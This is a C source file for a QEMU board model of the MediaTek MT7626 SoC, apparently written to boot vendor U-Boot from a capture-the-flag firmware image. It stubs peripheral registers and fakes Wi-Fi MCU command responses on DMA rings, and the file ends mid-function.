/*
 * Minimal MediaTek/Airoha "leopard" (MT7626) board model
 *
 * Just enough hardware to run the vendor U-Boot extracted from
 * ctf-firmware.bin to its prompt over the serial console:
 *   - Cortex-A7 CPU
 *   - 256 MiB DRAM at 0x40000000
 *   - 16550 UART at 0x11002000 (regshift=2)
 *   - free-running 32-bit microsecond counter at 0x10004048
 *   - RAM-backed catch-all stubs for SoC peripheral pages the boot
 *     code pokes (sysctrl, clk, GPIO, NAND, ETH, etc.)
 *
 * Boot model: load the LZMA-decompressed U-Boot blob to 0x41c00000
 * and start execution there (DRAM init has already run on real HW).
 */

#include "qemu/osdep.h"
#include "qapi/error.h"
#include "qemu/error-report.h"
#include "qemu/units.h"
#include "qemu/timer.h"
#include "hw/core/boards.h"
#include "hw/arm/boot.h"
#include "hw/arm/machines-qom.h"
#include "hw/char/serial-mm.h"
#include "hw/core/loader.h"
#include "hw/core/sysbus.h"
#include "hw/intc/arm_gic.h"
#include "hw/core/irq.h"
#include "hw/core/qdev-properties.h"
#include "system/address-spaces.h"
#include "system/system.h"
#include "system/reset.h"
#include "target/arm/cpu-qom.h"
#include "target/arm/cpu.h"
#include "chardev/char.h"
#include "chardev/char-fe.h"
#include "target/arm/gtimer.h"
#include "net/net.h"
#include "system/dma.h"
#include "qom/object.h"

#define LEOPARD_DRAM_BASE   0x40000000
#define LEOPARD_DRAM_SIZE   (256 * MiB)
#define LEOPARD_UBOOT_LOAD  0x41c00000
#define LEOPARD_RTOS_LOAD   0x40205000   /* main system image base */

#define LEOPARD_UART_BASE   0x11002000
#define LEOPARD_TIMER_BASE  0x10004000
#define LEOPARD_TIMER_SIZE  0x1000
#define LEOPARD_CONNSYS_BASE 0x18000000
#define LEOPARD_CONNSYS_SIZE 0x01000000

/* --- catch-all logger for unmapped peripheral pages ---------------------
 * Reports up to N distinct (page, offset) read/write pairs to stderr, so
 * we can discover what registers the boot code expects without polluting
 * the log with megabytes of noise from a single poll loop.
 */
#define LEOPARD_LOG_LIMIT 1024
static struct { uint64_t addr; bool is_write; int count; } leopard_log[LEOPARD_LOG_LIMIT];
static int leopard_log_n;

static void leopard_log_access(hwaddr a, bool is_write, uint64_t val, unsigned size)
{
    int i;
    for (i = 0; i < leopard_log_n; i++) {
        if (leopard_log[i].addr == a && leopard_log[i].is_write == is_write) {
            leopard_log[i].count++;
            /* show first 2 hits, then once per 1M to surface long polling loops */
            if (leopard_log[i].count < 2 ||
                (leopard_log[i].count % 1000000) == 0) {
                fprintf(stderr, "[leopard] %s %#" PRIx64 " sz=%u val=%#" PRIx64
                        " (count=%d)\n",
                        is_write ? "WR" : "RD", a, size, val,
                        leopard_log[i].count);
            }
            return;
        }
    }
    if (leopard_log_n < LEOPARD_LOG_LIMIT) {
        leopard_log[leopard_log_n++] = (typeof(leopard_log[0])){a, is_write, 1};
        fprintf(stderr, "[leopard] %s %#" PRIx64 " sz=%u val=%#" PRIx64 " (NEW)\n",
                is_write ? "WR" : "RD", a, size, val);
    }
}

static bool leopard_env_disabled(const char *name)
{
    const char *env = getenv(name);

    return env && (!strcmp(env, "0") || !g_ascii_strcasecmp(env, "false") ||
                   !g_ascii_strcasecmp(env, "off") ||
                   !g_ascii_strcasecmp(env, "no"));
}

static uint8_t leopard_debug_read8(uint32_t addr);
static uint32_t leopard_debug_read32(uint32_t addr);
static void leopard_debug_write8(uint32_t addr, uint8_t val);
static void leopard_debug_write32(uint32_t addr, uint32_t val);

static void leopard_connsys_ring_trace(hwaddr off, bool is_write,
                                       uint64_t val, unsigned size)
{
    CPUState *cs;
    ARMCPU *acpu;
    uint32_t pc = 0;
    uint32_t lr = 0;

    if (!getenv("LEOPARD_CONNSYS_RING_TRACE")) {
        return;
    }
    if (off != 0x4200 && off != 0x4204 &&
        off != 0x43f0 && off != 0x43f4 &&
        off != 0x43f8 && off != 0x43fc) {
        return;
    }

    cs = qemu_get_cpu(0);
    acpu = cs ? ARM_CPU(cs) : NULL;
    if (acpu) {
        pc = acpu->env.regs[15];
        lr = acpu->env.regs[14];
    }
    fprintf(stderr,
            "[connsys-ring] %s off=%#" HWADDR_PRIx " sz=%u val=%#" PRIx64
            " pc=%#x lr=%#x\n",
            is_write ? "WR" : "RD", off, size, val, pc, lr);
}

/* --- MT7626 CONNSYS / Wi-Fi EMI register stub ---------------------------
 * wlanInit's Wi-Fi EMI probe polls the CONNSYS version block before the
 * mt7626 AP driver is allowed to continue.  The broad peripheral RAM
 * catch-all returns zero here, which makes do_check_connsys_version_proc()
 * time out.  Keep this as a small sparse register file with plausible ID
 * defaults and read-after-write behavior for the reset/clock bits the probe
 * toggles around it.
 */
typedef struct LeopardConnsysReg {
    uint32_t off;
    uint32_t val;
    bool valid;
} LeopardConnsysReg;

typedef enum LeopardConnsysRingKind {
    LEOPARD_CONNSYS_RING_TX,
    LEOPARD_CONNSYS_RING_RX,
} LeopardConnsysRingKind;

typedef struct LeopardConnsysRingInfo {
    uint32_t base_off;
    const char *name;
    LeopardConnsysRingKind kind;
    uint32_t tx_done_bit;
    const char *completion_path;
} LeopardConnsysRingInfo;

typedef struct LeopardWifiMcuTx {
    uint32_t ring_off;
    uint32_t seq;
    uint32_t cmd;
    uint32_t ext;
    uint32_t txd0;
    bool valid;
} LeopardWifiMcuTx;

typedef struct LeopardConnsysFixedReg {
    uint32_t off;
    uint32_t val;
    const char *name;
} LeopardConnsysFixedReg;

typedef struct LeopardWifiMcuResponseProfile {
    uint32_t ring_off;
    int cmd;
    int ext;
    uint8_t status;
    uint8_t body_len;
    const char *name;
} LeopardWifiMcuResponseProfile;

/*
 * WPDMA rings used by the MT7626 Wi-Fi driver in this firmware.  The
 * completion bits are from runtime dispatcher traces, not register spacing.
 */
static const LeopardConnsysRingInfo leopard_connsys_rings[] = {
    { 0x4300, "tx0",     LEOPARD_CONNSYS_RING_TX, 0,          NULL },
    { 0x4310, "tx-data", LEOPARD_CONNSYS_RING_TX, 0x00400000, "shared WPDMA service" },
    { 0x4320, "tx2",     LEOPARD_CONNSYS_RING_TX, 0,          NULL },
    { 0x4330, "tx-cmd",  LEOPARD_CONNSYS_RING_TX, 0x00000080, "MCU command service" },
    { 0x4340, "tx4",     LEOPARD_CONNSYS_RING_TX, 0,          NULL },
    { 0x4350, "tx-mgmt", LEOPARD_CONNSYS_RING_TX, 0x00400000, "shared WPDMA service" },
    { 0x4360, "tx6",     LEOPARD_CONNSYS_RING_TX, 0,          NULL },
    { 0x43f0, "tx-ext",  LEOPARD_CONNSYS_RING_TX, 0x00080000, "extended command reclaim" },
    { 0x4400, "rx0",     LEOPARD_CONNSYS_RING_RX, 0,          NULL },
    { 0x4410, "rx1",     LEOPARD_CONNSYS_RING_RX, 0,          NULL },
};

static const LeopardConnsysFixedReg leopard_connsys_fixed_regs[] = {
    { 0x00002000, 0x76260000, "CONNSYS_HW_VERSION" },
    { 0x00002004, 0x00000001, "CONNSYS_FW_VERSION" },
    { 0x000b1010, 0x10050000, "CONNSYS_VERSION_ID" },
    { 0x000b101c, 0x00000001, "CONNSYS_CONFIG_ID" },
    { 0x00002600, 0x00001d1e, "CONNSYS_POWER_ON_DONE" },
};

static const LeopardWifiMcuResponseProfile leopard_wifi_mcu_profiles[] = {
    /*
     * Patch/download commands expect a non-zero first status byte for the
     * first response, then success statuses after sequencing starts.
     */
    { 0x4330, -1,   -1,   0x01, 0x08, "patch/firmware command ready" },
    /*
     * Extended command responses are EventExtCmdResult: cmd/ext followed by
     * u4Status.  ext 0x2a has a longer body in this firmware.
     */
    { 0x43f0, -1,   0x2a, 0x00, 0x10, "extended command 0x2a result" },
    { 0x43f0, -1,   -1,   0x00, 0x08, "extended command result" },
};

static struct {
    LeopardConnsysReg reg[512];
    uint32_t int_status;
    uint32_t int_mask;
    qemu_irq irq;
    uint32_t fake_rx_next_slot;
    uint32_t fake_mcu_seq;
    uint32_t fw_sync_stage;
} connsys;

static LeopardConnsysReg *leopard_connsys_find(uint32_t off, bool create)
{
    int free_idx = -1;

    for (int i = 0; i < ARRAY_SIZE(connsys.reg); i++) {
        if (connsys.reg[i].valid && connsys.reg[i].off == off) {
            return &connsys.reg[i];
        }
        if (!connsys.reg[i].valid && free_idx < 0) {
            free_idx = i;
        }
    }
    if (create && free_idx >= 0) {
        connsys.reg[free_idx].valid = true;
        connsys.reg[free_idx].off = off;
        connsys.reg[free_idx].val = 0;
        return &connsys.reg[free_idx];
    }
    return NULL;
}

static uint32_t leopard_connsys_reg_readback(uint32_t off)
{
    LeopardConnsysReg *r = leopard_connsys_find(off & ~3u, false);

    return r ? r->val : 0;
}

static void leopard_connsys_update_irq(void);
static void leopard_connsys_maybe_force_rx_consumer(uint32_t ring_off,
                                                    uint32_t new_idx);
static void leopard_connsys_fill_rx_file_at_wait(void);

static const LeopardConnsysRingInfo *
leopard_connsys_ring_by_base(uint32_t ring_off)
{
    for (int i = 0; i < ARRAY_SIZE(leopard_connsys_rings); i++) {
        if (leopard_connsys_rings[i].base_off == ring_off) {
            return &leopard_connsys_rings[i];
        }
    }
    return NULL;
}

static const LeopardConnsysRingInfo *
leopard_connsys_ring_by_cpu_idx(uint32_t off)
{
    for (int i = 0; i < ARRAY_SIZE(leopard_connsys_rings); i++) {
        if (leopard_connsys_rings[i].base_off + 0x08 == off) {
            return &leopard_connsys_rings[i];
        }
    }
    return NULL;
}

static const LeopardConnsysFixedReg *
leopard_connsys_fixed_reg(uint32_t off)
{
    for (int i = 0; i < ARRAY_SIZE(leopard_connsys_fixed_regs); i++) {
        if (leopard_connsys_fixed_regs[i].off == off) {
            return &leopard_connsys_fixed_regs[i];
        }
    }
    return NULL;
}

static const LeopardWifiMcuResponseProfile *
leopard_wifi_mcu_response_profile(const LeopardWifiMcuTx *tx)
{
    const LeopardWifiMcuResponseProfile *fallback = NULL;

    for (int i = 0; i < ARRAY_SIZE(leopard_wifi_mcu_profiles); i++) {
        const LeopardWifiMcuResponseProfile *profile =
            &leopard_wifi_mcu_profiles[i];

        if (profile->ring_off != tx->ring_off ||
            (profile->cmd >= 0 && profile->cmd != (int)tx->cmd)) {
            continue;
        }
        if (profile->ext == (int)tx->ext) {
            return profile;
        }
        if (profile->ext < 0) {
            fallback = profile;
        }
    }
    return fallback;
}

static LeopardWifiMcuTx leopard_wifi_mcu_decode_tx(uint32_t ring_off,
                                                   uint32_t new_idx)
{
    uint32_t tx_base = leopard_connsys_reg_readback(ring_off + 0x00);
    uint32_t tx_max = leopard_connsys_reg_readback(ring_off + 0x04);
    uint32_t tx_desc_idx = 0;
    uint32_t tx_buf = 0;
    uint32_t txd12 = 0;
    uint32_t txd16 = 0;
    LeopardWifiMcuTx tx = {
        .ring_off = ring_off,
        .seq = new_idx,
    };

    if (!tx_base || !tx_max) {
        return tx;
    }

    tx_desc_idx = (new_idx == 0) ? tx_max - 1 : new_idx - 1;
    tx_desc_idx %= tx_max;
    tx_buf = leopard_debug_read32(tx_base + tx_desc_idx * 16);
    if (!tx_buf) {
        return tx;
    }

    tx.txd0 = leopard_debug_read32(tx_buf);
    txd12 = leopard_debug_read32(tx_buf + 0x24);
    txd16 = leopard_debug_read32(tx_buf + 0x28);
    if ((tx.txd0 & 0xff000000) != 0x80000000) {
        return tx;
    }

    tx.cmd = txd12 & 0xff;
    tx.ext = (txd16 >> 8) & 0xff;
    if (ring_off == 0x43f0) {
        tx.seq = (txd12 >> 24) & 0xff;
    } else if (new_idx == 1 || connsys.fake_mcu_seq == 0) {
        connsys.fake_mcu_seq = 1;
        tx.seq = connsys.fake_mcu_seq;
    } else {
        connsys.fake_mcu_seq++;
        tx.seq = connsys.fake_mcu_seq;
    }
    tx.valid = true;
    return tx;
}

static size_t leopard_wifi_mcu_build_cmd_response(const LeopardWifiMcuTx *tx,
                                                  uint8_t ev[128],
                                                  uint32_t *word0)
{
    const LeopardWifiMcuResponseProfile *profile =
        leopard_wifi_mcu_response_profile(tx);
    uint32_t rsp_body_len = profile ? profile->body_len : 0x08;
    uint8_t status = profile ? profile->status : 0x00;

    memset(ev, 0, 128);
    if (!*word0) {
        *word0 = 0xe0000000 | (rsp_body_len + 0x33);
    }
    ev[0] = *word0 & 0xff;
    ev[1] = (*word0 >> 8) & 0xff;
    ev[2] = (*word0 >> 16) & 0xff;
    ev[3] = (*word0 >> 24) & 0xff;
    ev[16] = 0x0c + rsp_body_len;
    ev[20] = 0xed; /* MCU event packet marker. */
    ev[21] = tx->seq > 1 ? tx->seq : 0x01;
    ev[24] = 0x35; /* command response event subtype. */
    ev[28] = tx->seq > 1 ? 0x00 : status;
    ev[32] = ev[21];

    if (tx->seq >= 4) {
        connsys.fw_sync_stage = 3;
    }
    if (tx->ring_off == 0x43f0) {
        /*
         * Extended-command callbacks receive EventExtCmdResult at the
         * response payload pointer: command identity first, then the 32-bit
         * u4Status at payload+4.  The MCU sequence stays in the event header.
         */
        ev[28] = tx->cmd;
        ev[29] = tx->ext;
        ev[32] = 0x00;
        ev[33] = 0x00;
        ev[34] = 0x00;
        ev[35] = 0x00;
    }
    if (!profile && getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] no response profile ring=%#x cmd=%#x ext=%#x; "
                "using generic success\n",
                tx->ring_off, tx->cmd, tx->ext);
    }
    if (!profile && getenv("LEOPARD_WIFI_MCU_STRICT_PROFILES")) {
        return 0;
    }
    return 64;
}

static void leopard_connsys_trace_mcu_tx(uint32_t ring_off, uint32_t new_idx)
{
    const char *trace = getenv("LEOPARD_WIFI_MCU_TRACE");
    uint32_t base;
    uint32_t max;
    uint32_t desc_idx;
    uint32_t desc;
    uint32_t buf;
    uint32_t txd0;
    uint32_t txd1;
    uint32_t txd8;
    uint32_t txd12;
    uint32_t txd16;
    uint32_t txd20;
    uint32_t buf16_0 = 0;
    uint32_t buf16_4 = 0;
    uint32_t buf16_8 = 0;
    uint32_t buf16_12 = 0;
    CPUState *cs;
    ARMCPU *acpu;
    uint32_t pc = 0;
    uint32_t lr = 0;

    if (!trace || !*trace) {
        return;
    }

    base = leopard_connsys_reg_readback(ring_off + 0x00);
    max = leopard_connsys_reg_readback(ring_off + 0x04);
    if (!base || !max) {
        return;
    }

    desc_idx = (new_idx == 0) ? max - 1 : new_idx - 1;
    if (desc_idx >= max) {
        desc_idx %= max;
    }
    desc = base + desc_idx * 16;
    buf = leopard_debug_read32(desc);
    txd0 = leopard_debug_read32(buf);
    txd1 = leopard_debug_read32(buf + 4);
    txd8 = leopard_debug_read32(buf + 0x20);
    txd12 = leopard_debug_read32(buf + 0x24);
    txd16 = leopard_debug_read32(buf + 0x28);
    txd20 = leopard_debug_read32(buf + 0x2c);
    if (txd16) {
        buf16_0 = leopard_debug_read32(txd16);
        buf16_4 = leopard_debug_read32(txd16 + 4);
        buf16_8 = leopard_debug_read32(txd16 + 8);
        buf16_12 = leopard_debug_read32(txd16 + 12);
    }

    cs = qemu_get_cpu(0);
    acpu = cs ? ARM_CPU(cs) : NULL;
    if (acpu) {
        pc = acpu->env.regs[15];
        lr = acpu->env.regs[14];
    }

    fprintf(stderr,
            "[wifi-mcu] tx ring_off=%#x idx=%u/%u desc=%#x buf=%#x "
            "txd0=%#x txd1=%#x txd8=%#x txd12=%#x txd16=%#x txd20=%#x "
            "ptr16=%#x/%#x/%#x/%#x pc=%#x lr=%#x\n",
            ring_off, new_idx, max, desc, buf, txd0, txd1, txd8, txd12,
            txd16, txd20, buf16_0, buf16_4, buf16_8, buf16_12, pc, lr);
}

static bool leopard_connsys_is_tx_ring(uint32_t ring_off)
{
    const LeopardConnsysRingInfo *ring =
        leopard_connsys_ring_by_base(ring_off);

    return ring && ring->kind == LEOPARD_CONNSYS_RING_TX;
}

static bool leopard_connsys_is_tx_cpu_idx(uint32_t off)
{
    const LeopardConnsysRingInfo *ring =
        leopard_connsys_ring_by_cpu_idx(off);

    return ring && ring->kind == LEOPARD_CONNSYS_RING_TX;
}

static bool leopard_connsys_is_rx_cpu_idx(uint32_t off)
{
    const LeopardConnsysRingInfo *ring =
        leopard_connsys_ring_by_cpu_idx(off);

    return ring && ring->kind == LEOPARD_CONNSYS_RING_RX;
}

static void leopard_connsys_set_reg_readback(uint32_t off, uint32_t val)
{
    LeopardConnsysReg *r = leopard_connsys_find(off & ~3u, true);

    if (r) {
        r->val = val;
    }
}

static uint32_t leopard_connsys_tx_irq_bit(uint32_t ring_off)
{
    const LeopardConnsysRingInfo *ring =
        leopard_connsys_ring_by_base(ring_off);

    return ring ? ring->tx_done_bit : 0;
}

static void leopard_connsys_kick_tx_ring(uint32_t ring_off, uint32_t new_idx)
{
    const char *trace = getenv("LEOPARD_WIFI_MCU_TRACE");
    uint32_t base = leopard_connsys_reg_readback(ring_off + 0x00);
    uint32_t max = leopard_connsys_reg_readback(ring_off + 0x04);
    uint32_t dma_idx = leopard_connsys_reg_readback(ring_off + 0x0c);
    uint32_t consumed = 0;

    if (!leopard_connsys_is_tx_ring(ring_off) || !base || !max) {
        return;
    }
    if (max > 4096) {
        max = 4096;
    }
    new_idx %= max;
    dma_idx %= max;

    while (dma_idx != new_idx && consumed < max) {
        uint32_t desc = base + dma_idx * 16;
        uint32_t word1 = leopard_debug_read32(desc + 4);

        leopard_debug_write8(desc + 7, leopard_debug_read8(desc + 7) | 0x80);
        leopard_debug_write32(desc + 4, word1 | 0x80000000u);
        dma_idx = (dma_idx + 1) % max;
        consumed++;
    }
    leopard_connsys_set_reg_readback(ring_off + 0x0c, dma_idx);

    if (trace && *trace && consumed) {
        fprintf(stderr,
                "[wifi-mcu] tx-consume ring_off=%#x consumed=%u dma_idx=%u "
                "cpu_idx=%u\n",
                ring_off, consumed, dma_idx, new_idx);
    }
}

static void leopard_connsys_maybe_tx_done(uint32_t ring_off)
{
    uint32_t bit;

    if (leopard_env_disabled("LEOPARD_WIFI_TX_DONE")) {
        return;
    }

    bit = leopard_connsys_tx_irq_bit(ring_off);
    if (!bit) {
        return;
    }
    connsys.int_status |= bit;
    leopard_connsys_update_irq();
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        const LeopardConnsysRingInfo *ring =
            leopard_connsys_ring_by_base(ring_off);

        fprintf(stderr,
                "[wifi-mcu] tx-done ring=%s off=%#x bit=%#x status=%#x "
                "mask=%#x path=%s\n",
                ring ? ring->name : "?", ring_off, bit, connsys.int_status,
                connsys.int_mask,
                ring && ring->completion_path ? ring->completion_path : "?");
    }
}

static void leopard_connsys_maybe_mcu_event_bit(uint32_t ring_off,
                                                uint32_t new_idx)
{
    const char *env = getenv("LEOPARD_WIFI_MCU_EVENT_BIT");
    char *endp = NULL;
    uint32_t bit;

    if (!env || !*env || ring_off != 0x4330 || new_idx != 1) {
        return;
    }

    bit = (uint32_t)strtoul(env, &endp, 0);
    if (!bit || (endp && *endp) || !(connsys.int_mask & bit)) {
        if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
            fprintf(stderr,
                    "[wifi-mcu] skip event bit env=\"%s\" bit=%#x mask=%#x\n",
                    env, bit, connsys.int_mask);
        }
        return;
    }

    /*
     * Diagnostic only: this raises a candidate WPDMA/MCU interrupt bit after
     * the first patch command TX.  It lets us map which firmware dispatcher
     * path owns command responses without mutating firmware state in GDB.
     */
    connsys.int_status |= bit;
    leopard_connsys_update_irq();
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] event-bit ring_off=%#x idx=%u bit=%#x "
                "status=%#x mask=%#x\n",
                ring_off, new_idx, bit, connsys.int_status,
                connsys.int_mask);
    }
}

static void leopard_connsys_fill_fake_rx_slot(uint32_t rx_ring_off,
                                              uint32_t desc_idx,
                                              const uint8_t *payload,
                                              size_t len)
{
    uint32_t base = leopard_connsys_reg_readback(rx_ring_off + 0x00);
    uint32_t max = leopard_connsys_reg_readback(rx_ring_off + 0x04);
    uint32_t desc;
    uint32_t buf;

    if (!base || !max || desc_idx >= max || len > 0x3fff) {
        return;
    }

    desc = base + desc_idx * 16;
    buf = leopard_debug_read32(desc);
    if (!buf) {
        return;
    }

    address_space_write(&address_space_memory, buf, MEMTXATTRS_UNSPECIFIED,
                        payload, len);
    leopard_debug_write8(desc + 6, len & 0xff);
    /* Bit 7 = DMA owns/filled descriptor, bit 6 = end of packet. */
    leopard_debug_write8(desc + 7, 0xc0 | ((len >> 8) & 0x3f));

    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] fake-rx ring_off=%#x idx=%u/%u desc=%#x "
                "buf=%#x len=%zu b0=%#x b4=%#x\n",
                rx_ring_off, desc_idx, max, desc, buf, len,
                payload[0], len > 4 ? payload[4] : 0);
    }
}

static void leopard_connsys_raise_fake_rx_status(uint32_t status)
{
    connsys.int_status |= status;
    leopard_connsys_update_irq();
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] fake-rx-status status_bit=%#x status=%#x "
                "mask=%#x\n",
                status, connsys.int_status, connsys.int_mask);
    }
}

static void leopard_connsys_maybe_fake_rx_event(uint32_t ring_off,
                                                uint32_t new_idx)
{
    const char *env = getenv("LEOPARD_WIFI_FAKE_RX_EVENT");
    const char *cmd_event_env = getenv("LEOPARD_WIFI_FAKE_RX_CMD_EVENT");
    const char *cmd_event_mode = cmd_event_env;
    bool explicit_fake = env && *env;
    bool cmd_event_enabled;
    const char *rx_file_env;
    const char *word0_env;
    const char *status_env;
    uint32_t word0 = 0x10;
    uint32_t status = 0x400003;
    uint32_t rx0_max;
    uint32_t rx1_max;
    bool duplicate_rx = false;
    uint32_t fake_seq = new_idx;
    LeopardWifiMcuTx tx = { 0 };
    uint8_t *rx_payload = NULL;
    size_t rx_payload_len = 0;
    uint8_t ev[128] = {
        0x10, 0x00, 0x00, 0x00,  /* event type */
        0x01, 0x00, 0x00, 0x00,  /* first command sequence */
    };

    if (leopard_env_disabled("LEOPARD_WIFI_FAKE_RX_EVENT") ||
        (ring_off != 0x4330 && ring_off != 0x43f0)) {
        return;
    }

    /*
     * Real CONNSYS firmware acknowledges WPDMA command TXs by putting MCU
     * event records on the RX ring and raising the shared WPDMA interrupt.
     * Earlier bring-up required LEOPARD_WIFI_FAKE_RX_EVENT=1 plus
     * LEOPARD_WIFI_FAKE_RX_CMD_EVENT=6; keep the selectable packet shapes for
     * experiments, but make the hardware-like command response the default.
     */
    if (!cmd_event_mode || !*cmd_event_mode) {
        cmd_event_mode = "6";
    }
    cmd_event_enabled = !leopard_env_disabled("LEOPARD_WIFI_FAKE_RX_CMD_EVENT");
    if (!explicit_fake && !cmd_event_enabled) {
        return;
    }
    if (new_idx != 1 && strcmp(cmd_event_mode, "6")) {
        return;
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "6")) {
        tx = leopard_wifi_mcu_decode_tx(ring_off, new_idx);
        if (!tx.valid) {
            return;
        }
        fake_seq = tx.seq;
    }

    word0_env = getenv("LEOPARD_WIFI_FAKE_RX_WORD0");
    if (word0_env && *word0_env) {
        word0 = (uint32_t)strtoul(word0_env, NULL, 0);
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
    }
    if (cmd_event_enabled) {
        memset(ev, 0, sizeof(ev));
        if (!word0_env || !*word0_env) {
            word0 = sizeof(ev);
        }
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
        ev[4] = 0xed;  /* MCU event packet marker. */
        ev[8] = 0x35;  /* command response event subtype. */
        ev[12] = 0x10; /* command response payload starts here. */
        ev[16] = 0x01; /* first command sequence. */
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "2")) {
        memset(ev, 0, sizeof(ev));
        if (!word0_env || !*word0_env) {
            word0 = 0xe0000040;
        }
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
        ev[16] = 0x20; /* copied event length and lookup key candidate. */
        ev[20] = 0xed; /* MCU event packet marker. */
        ev[21] = 0x01; /* first command sequence. */
        ev[24] = 0x35; /* command response event subtype. */
        ev[28] = 0x10; /* command response payload starts here. */
        ev[32] = 0x01; /* first command sequence. */
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "3")) {
        memset(ev, 0, sizeof(ev));
        if (!word0_env || !*word0_env) {
            word0 = 0xe0000040;
        }
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
        ev[16] = 0x0c; /* zero-length command response: len - 0x0c. */
        ev[20] = 0xed; /* MCU event packet marker. */
        ev[21] = 0x01; /* first command sequence. */
        ev[24] = 0x35; /* command response event subtype. */
        ev[28] = 0x10; /* command response payload starts here. */
        ev[32] = 0x01; /* first command sequence. */
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "4")) {
        memset(ev, 0, sizeof(ev));
        if (!word0_env || !*word0_env) {
            word0 = 0xe0000040;
        }
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
        ev[16] = 0x14; /* wrapper plus an 8-byte patch-status body. */
        ev[20] = 0xed; /* MCU event packet marker. */
        ev[24] = 0x35; /* patch/command response event subtype. */
        ev[28] = 0x10; /* patch handler case selector. */
        ev[32] = 0x01; /* first command sequence. */
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "5")) {
        memset(ev, 0, sizeof(ev));
        if (!word0_env || !*word0_env) {
            word0 = 0xe0000040;
        }
        ev[0] = word0 & 0xff;
        ev[1] = (word0 >> 8) & 0xff;
        ev[2] = (word0 >> 16) & 0xff;
        ev[3] = (word0 >> 24) & 0xff;
        ev[16] = 0x20; /* first copy establishes the expected length. */
        ev[20] = 0xed; /* MCU event packet marker. */
        ev[21] = 0x01; /* first command sequence. */
        ev[24] = 0x35; /* command response event subtype. */
        ev[28] = 0x10; /* command response payload starts here. */
        ev[32] = 0x01; /* first command sequence. */
        duplicate_rx = true;
    }
    if (cmd_event_enabled && !strcmp(cmd_event_mode, "6")) {
        uint32_t response_word0 = word0_env && *word0_env ? word0 : 0;

        rx_payload_len = leopard_wifi_mcu_build_cmd_response(&tx, ev,
                                                             &response_word0);
        if (!rx_payload_len) {
            return;
        }
        word0 = response_word0;
        duplicate_rx = true;
        if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
            const LeopardWifiMcuResponseProfile *profile =
                leopard_wifi_mcu_response_profile(&tx);

            fprintf(stderr,
                    "[wifi-mcu] fake-cmd-rsp tx_ring=%#x seq=%u cmd=%#x "
                    "ext=%#x body_len=%#x word0=%#x evlen=%#x profile=%s\n",
                    ring_off, tx.seq, tx.cmd, tx.ext,
                    profile ? profile->body_len : 0x08, word0, ev[16],
                    profile ? profile->name : "generic");
        }
    }

    status_env = getenv("LEOPARD_WIFI_FAKE_RX_STATUS");
    if (status_env && *status_env) {
        status = (uint32_t)strtoul(status_env, NULL, 0);
    }

    rx_payload = ev;
    if (!rx_payload_len) {
        rx_payload_len = sizeof(ev);
    }
    rx_file_env = getenv("LEOPARD_WIFI_FAKE_RX_FILE");
    if (rx_file_env && *rx_file_env) {
        bool after_fw_sync = getenv("LEOPARD_WIFI_FAKE_RX_FILE_AFTER_FW_SYNC");
        const char *min_seq_env = getenv("LEOPARD_WIFI_FAKE_RX_FILE_MIN_SEQ");
        uint32_t min_seq = 0;

        if (min_seq_env && *min_seq_env) {
            min_seq = (uint32_t)strtoul(min_seq_env, NULL, 0);
        }

        if ((after_fw_sync && connsys.fw_sync_stage < 3) ||
            (min_seq && fake_seq < min_seq)) {
            if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                fprintf(stderr,
                        "[wifi-mcu] fake-rx-file deferred path=%s "
                        "fw_sync_stage=%u seq=%u min_seq=%u\n",
                        rx_file_env, connsys.fw_sync_stage, fake_seq,
                        min_seq);
            }
        } else {
            gchar *contents = NULL;
            gsize contents_len = 0;
            GError *err = NULL;

            if (!g_file_get_contents(rx_file_env, &contents, &contents_len,
                                     &err)) {
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] fake-rx-file read failed path=%s "
                            "err=%s\n",
                            rx_file_env, err ? err->message : "unknown");
                }
                g_clear_error(&err);
            } else if (contents_len == 0 || contents_len > 0x3fff) {
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] fake-rx-file rejected path=%s "
                            "len=%zu\n",
                            rx_file_env, (size_t)contents_len);
                }
                g_free(contents);
            } else {
                rx_payload = (uint8_t *)contents;
                rx_payload_len = contents_len;
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] fake-rx-file path=%s len=%zu\n",
                            rx_file_env, rx_payload_len);
                }
            }
        }
    }

    /*
     * Diagnostic only: populate both likely first RX slots.  The firmware
     * initially programs RX CPU_IDX to max-1, and different driver paths may
     * inspect either the wrapped slot or the current descriptor while we are
     * still mapping the exact DMA-index convention.
     */
    rx0_max = leopard_connsys_reg_readback(0x4404);
    rx1_max = leopard_connsys_reg_readback(0x4414);
    if (ring_off == 0x4330 && new_idx == 1) {
        connsys.fake_rx_next_slot = 0;
    }
    if (!rx0_max || connsys.fake_rx_next_slot >= rx0_max) {
        connsys.fake_rx_next_slot = 0;
    }
    leopard_connsys_fill_fake_rx_slot(0x4400, connsys.fake_rx_next_slot,
